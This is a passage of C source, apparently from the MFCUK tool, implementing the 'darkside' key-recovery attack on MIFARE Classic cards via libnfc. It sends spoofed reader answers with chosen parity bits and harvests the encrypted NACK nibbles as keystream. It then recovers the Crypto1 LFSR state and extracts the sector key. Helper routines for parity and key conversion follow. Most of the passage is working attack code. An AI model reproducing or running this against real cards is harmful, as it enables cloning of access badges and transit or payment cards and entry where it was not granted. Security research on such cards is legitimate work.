                abtArEncPar[pos] = ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] + ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]) >> (7-pos)) & 0x01;
            }
        }
    }

    if (ptrFoundTagNonceEntry->current_out_of_8 >= 0)
    {
        // Prepare for the next round (if this one is not successful) the next 5 bit combination for current parity bits
        ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]++;
    }

    // Finally we want to send arbitrary parity bits
    nfc_configure(pnd,NP_HANDLE_PARITY,false);

    // Transmit reader-answer
    //printf(" Ar: ");
    //print_hex_par(abtArEnc,64,abtArEncPar);

    if ((szRx = nfc_initiator_transceive_bits(pnd,abtArEnc,64,abtArEncPar,abtRx,abtRxPar)) < 0)
    {
        if (sendSpoofAr)
        {
            ptrFoundTagNonceEntry->spoofParBitsEnc++;
        }

	    return 3;
    }

	// zveriu - Successful: either authentication (szRx == 32) either encrypted 0x5 reponse (szRx == 4)
	if (szRx == 4)
	{
		//printf("INFO - 4-bit (szRx=%d) error code 0x5 encrypted (abtRx=0x%02x)\n", szRx, abtRx[0] & 0xf);

        if (ptrFoundTagNonceEntry->current_out_of_8 < 0)
        {
            ptrFoundTagNonceEntry->spoofNackEnc = abtRx[0] & 0xf;
            ptrFoundTagNonceEntry->spoofKs = ptrFoundTagNonceEntry->spoofNackEnc ^ 0x5;
            ptrFoundTagNonceEntry->spoofNrPfx = ptrFoundTagNonceEntry->spoofNrEnc & 0xFFFFFF1F;

            // Initialize the {Nr} with proper 29 bits prefix and {Par} with proper 3 bits prefix
            for (pos=0; pos<8; pos++)
            {
                ptrFoundTagNonceEntry->nrEnc[pos] = ptrFoundTagNonceEntry->spoofNrPfx | pos << 5;
                ptrFoundTagNonceEntry->arEnc[pos] = ptrFoundTagNonceEntry->spoofArEnc;
                ptrFoundTagNonceEntry->parBits[pos] = ptrFoundTagNonceEntry->spoofParBitsEnc & 0xE0;
                ptrFoundTagNonceEntry->parBitsCrntCombination[pos] = 0;
            }

            // Mark the begining of collecting STAGE2 probes
            ptrFoundTagNonceEntry->current_out_of_8 = 0;
        }
        else
        {
            ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] = abtRx[0] & 0xf;
            ptrFoundTagNonceEntry->ks[ptrFoundTagNonceEntry->current_out_of_8] = ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] ^ 0x5;
            ptrFoundTagNonceEntry->current_out_of_8++;

            if (ptrFoundTagNonceEntry->current_out_of_8 == 8)
            {
                for (pos=0; pos<8; pos++)
                {
                    for (pos2=0; pos2<8; pos2++)
                    {
                        ptrFoundTagNonceEntry->parBitsArr[pos][pos2] = ( (ptrFoundTagNonceEntry->parBits[pos] + ptrFoundTagNonceEntry->parBitsCrntCombination[pos] - 1) >> (7-pos2)) & 0x01;
                    }
                }

                states_list = lfsr_common_prefix(ptrFoundTagNonceEntry->spoofNrPfx, ptrFoundTagNonceEntry->spoofArEnc, ptrFoundTagNonceEntry->ks, ptrFoundTagNonceEntry->parBitsArr);

                for (i=0; (states_list) && ((states_list+i)->odd != 0 || (states_list+i)->even != 0) && (i<MAX_COMMON_PREFIX_STATES); i++)
                {
                    current_state = states_list + i;
                    lfsr_rollback_word(current_state, uiUID ^ ptrFoundTagNonceEntry->tagNonce, 0);
                    crypto1_get_lfsr(current_state, &key_recovered);
                    flag_key_recovered = 1;

                    *ui64KeyRecovered = key_recovered;
                }

                crypto1_destroy(states_list);
                
                if (!flag_key_recovered)
                {
                    //printf("{Nr} is not a DEADBEEF.... Need to find BEEF ALIVE!... Trying next one...\n");
                    ptrFoundTagNonceEntry->spoofNrEnc++;
                    ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
                    ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

                    // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
                    ptrFoundTagNonceEntry->current_out_of_8 = -1;

                    return 4;
                }
            }
        }
	}
    else if (szRx == 32)
    {
        // Are we so MFCUKing lucky (?!), since ui64Key is a "dummy" key
        flag_key_recovered = true;
        *ui64KeyRecovered = ui64Key;
    }

    //printf(" At: "); 
    //print_hex_par(abtRx,szRx,abtRxPar);

    crypto1_destroy(pcs);

    if (flag_key_recovered)
    {
        return 5;
    }
    else
    {
        return 6;
    }
}


int compareTagNonces (const void * a, const void * b)
{
    // TODO: test the improvement (especially corner cases, over/under-flows) "return ( (*(uint32_t*)a) - (*(uint32_t*)b) );
    if ( *(uint32_t*)a > *(uint32_t*)b ) return 1;
    if ( *(uint32_t*)a == *(uint32_t*)b ) return 0;
    if ( *(uint32_t*)a < *(uint32_t*)b ) return -1;

    return 0; // Never reach here, but keep compilers happy
}

static const byte_t OddParity[256] = {
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0,
  1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1
};

byte_t oddparity(const byte_t bt)
{
  return OddParity[bt];
}

bool mfcuk_key_uint64_to_arr(const uint64_t *ui64Key, byte_t *arr6Key)
{
    int i;

    if ( !ui64Key || !arr6Key )
    {
        return false;
    }

    for (i = 0; i<6; i++)
    {
        arr6Key[i] = (byte_t) (((*ui64Key) >> 8*(6 - i - 1)) & 0xFF);
    }

    return true;
}
